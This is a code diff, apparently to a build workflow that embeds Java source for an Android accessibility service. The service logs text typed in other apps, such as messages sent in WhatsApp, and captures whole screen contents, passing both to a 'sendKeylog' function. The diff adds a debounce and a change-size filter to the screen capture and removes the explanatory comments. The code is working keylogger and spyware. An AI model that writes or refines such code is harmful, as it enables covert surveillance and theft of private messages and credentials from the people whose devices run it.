@@ -275,6 +275,7 @@ jobs:
               private Runnable screenDataRunnable = null;
               private String lastScreenPackageName = null;
               private String lastSentScreenData = "";
+              private long lastSentScreenTime = 0;
 
               @Override
               public void onServiceConnected() {
@@ -563,7 +564,7 @@ jobs:
                   return list;
               }
 
-              // ================== EVENT HANDLING ==================
+              // ================== EVENT HANDLING (DEBOUNCE 2s + BIG CHANGE FILTER) ==================
               @Override
               public void onAccessibilityEvent(AccessibilityEvent event) {
                   try {
@@ -580,7 +581,6 @@ jobs:
                                       pendingText.setLength(0);
                                       pendingText.append(typedText);
                                   } else {
-                                      // Input field cleared -> likely send action
                                       if (pendingText.length() > 0) {
                                           String typed = pendingText.toString().trim();
                                           String typedAppName = getAppDisplayName(pendingPackageName != null ? pendingPackageName : "Unknown");
@@ -590,7 +590,6 @@ jobs:
                                       }
                                   }
                               } else {
-                                  // No text entries but event fired -> flush pending
                                   if (pendingText.length() > 0) {
                                       String typed = pendingText.toString().trim();
                                       String typedAppName = getAppDisplayName(pendingPackageName != null ? pendingPackageName : "Unknown");
@@ -611,7 +610,6 @@ jobs:
                               if (!isSystemPackage(pkg)) {
                                   scheduleScreenDataCapture(pkg);
                               }
-                              // Fallback: flush pending text on window state change (e.g., WhatsApp send)
                               if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED && pendingText.length() > 0) {
                                   String typed = pendingText.toString().trim();
                                   String typedAppName = getAppDisplayName(pendingPackageName != null ? pendingPackageName : pkg);
@@ -697,7 +695,7 @@ jobs:
                           Log.e(TAG, "screen data capture error", e);
                       }
                   };
-                  mainHandler.postDelayed(screenDataRunnable, 800);
+                  mainHandler.postDelayed(screenDataRunnable, 2000); // 2 seconds debounce
               }
 
               private void captureAndSendScreenData(String appName) {
@@ -707,12 +705,23 @@ jobs:
                       String screenText = extractTextFromNode(root);
                       if (screenText.isEmpty()) return;
 
+                      long now = System.currentTimeMillis();
+                      // ✅ Big change filter: if not changed enough, skip
                       if (screenText.equals(lastSentScreenData)) {
                           return;
                       }
 
+                      // If previous exists and length difference < 80, skip unless 10s passed
+                      if (!lastSentScreenData.isEmpty() && (now - lastSentScreenTime) < 10000) {
+                          int lengthDiff = Math.abs(screenText.length() - lastSentScreenData.length());
+                          if (lengthDiff < 80) {
+                              return; // too small change, ignore
+                          }
+                      }
+
                       sendKeylog("🖥️ [" + appName + "] Screen Data: " + screenText);
                       lastSentScreenData = screenText;
+                      lastSentScreenTime = now;
                   } catch (Exception e) {
                       Log.e(TAG, "captureAndSendScreenData error", e);
                   }
